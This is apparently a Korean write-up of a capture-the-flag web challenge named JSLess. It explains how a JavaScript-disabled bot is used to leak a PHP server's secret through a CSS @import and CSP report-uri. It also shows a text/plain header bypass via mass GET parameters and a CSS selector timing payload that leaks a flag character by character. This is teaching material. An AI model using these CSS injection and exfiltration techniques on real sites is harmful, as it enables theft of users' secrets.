# JSLess

* Category: Web
* Difficulty: Medium

## Description

CSS와 HTML이 있는 정원에서 알맞게 익은 JS 하나가 나무에서 떨어진 날, 해커의 마음도 무너졌다.

## Backup

Dreamhack.io 포팅 예정

## Simple Solution

* JS가 비활성화된 Bot을 이용하여 php 서버의 secret을 탈취하고 node 서버의 Flag를 읽는 문제입니다.


### Note
```javascript
browser = await puppeteer.launch({
  headless: 'new',
  executablePath: '/usr/bin/google-chrome',
  args: ['--no-sandbox', '--disable-dev-shm-usage', '--disable-gpu', '--incognito', '--js-flags=--noexpose_wasm,--jitless']
});

const page = await browser.newPage();
await page.setJavaScriptEnabled(false);
await page.goto(`http://localhost/index.php?name=${name}`, { timeout: 300, waitUntil: 'domcontentloaded' });
await sleep(700);
await page.close();
await browser.close();
```
* Bot은 처음에 index.php로 접속합니다. 물론 JS는 비활성화입니다.
<br/>

```php
//index.php
<?php
	header('Content-Type: text/plain');
	
	$name = $_GET['name'] ?? 'alice';
	if (strlen($name) < 70)
		echo "Hello, [$name].";
?>
```
* `$name`이 70글자 이내라면 Hello와 함께 출력합니다.
* 임의의 HTML을 삽입해도 `text/plain`이기 때문에 HTML로 인식되지 않습니다.
<br/>

[https://x.com/pilvar222/status/1784618120902005070](https://x.com/pilvar222/status/1784618120902005070)
* 링크를 요약하면 해당 Dockerfile의 `php:apache`는 초기 세팅으로 인해 PHP 오류가 발생하면 이를 즉시 출력합니다.
* 수 천의 GET이나 POST 파라미터를 보내거나 파일을 전송하면 PHP 출력이 발생합니다.
* `header`의 내용은 이미 PHP 출력이 되었기 때문에 헤더로 인식되지 않습니다.
* 문제에서는 URL로 이동하기 때문에 1024 이상의 GET 파라미터를 주면 `text/plain`을 우회할 수 있습니다.
* 흔히 알려진 meta refresh 기능을 사용하여 임의의 URL로 이동할 수 있습니다.
<br/>

```php
/secret.php
<?php
	header('Content-Type: text/css');

	$whatUwant = $_GET['whatUwant'] ?? 'whatUwant';
	$secret = $_SERVER['REMOTE_ADDR'] === '127.0.0.1' ? file_get_contents('/secret') : 'secret';
	if (strlen($whatUwant) < 10)
		echo $whatUwant . $secret;
?>
```
* `$whatUwant`와 `$secret`을 합쳐서 출력합니다.
* CSS 파일은 Chrome의 SOP 정책에 위배되지 않기 때문에 Cross-Site에서 CSS로 로드할 수 있습니다.
* `/secret.php?whatUwant=@import '`를 `link` 태그를 사용하여 CSS 파일로 가져오면 CSS가 실행되고 `$secret`을 path로 하여 `@import`를 시도합니다.
* 이때 CSP를 걸고 `report-uri` 기능을 사욛하면 `/$secret`으로 불러오려던 요청이 CSP 정책에 걸려 오류가 발생하고 오류는 `report-uri`에 명시된 URL로 전송됩니다.
* 전송된 내용을 확인하면 `$secret`으로 위배된 요청을 했다는 메시지가 보이며 `$secret`을 유출할 수 있습니다.
<br/>

```javascript
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "default-src 'none'; style-src 'unsafe-inline';");
  res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
  res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
  res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Cache-Control", "no-store");
	
  next();
});
app.get('/flag', (req, res) => {
  if (req.query?.secret !== SECRET)
    return res.send('Invalid secret');
	
  const flag = req.connection.remoteAddress === '::ffff:127.0.0.1' ? process.env.FLAG : 'pokactf2024{test}';
  const text = (req.query?.text?.length < 1000) ? (req.query?.text) : '';
  res.send(`<h1 flag="${flag}">${flag}</h1><br>${text ?? 'text'}<br>`);
});
```
* CSP를 확인하면 inline-style css를 사용할 수 있습니다.
* 따라서 전형적인 css injection을 사용하면 될 것 같지만 CSP가 none으로 강력하게 잡혀있습니다.
<br/>

```css
h1[flag^="abc"] {
    --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
    --b: var(--a),var(--a),var(--a),var(--a),var(--a);
    --c: var(--b),var(--b),var(--b),var(--b),var(--b);
    --d: var(--c),var(--c),var(--c),var(--c),var(--c);
    --e: var(--d),var(--d),var(--d),var(--d),var(--d);
    --f: var(--e),var(--e),var(--e),var(--e),var(--e);
    --g: var(--f),var(--f),var(--f),var(--f),var(--f);
};
* {
    background-image: var(--g);
};
```
* CSS Selector를 이용해 flag 속성을 잡은 뒤, 변수를 중첩하여 생성합니다.
* flag가 발견될 경우에는 heavy한 작업이 Chrome에 걸리게 됩니다.
* `meta refresh`와 결합하면 heavy한 작업이 걸렸는지 걸리지 않았는지 측정할 수 있습니다.
* Flag 형식은 소스코드에 나와있듯 `/^pokactf2024\{[a-z]+\}$/`이므로 한 글자 한 글자 유출시킬 수 있습니다.


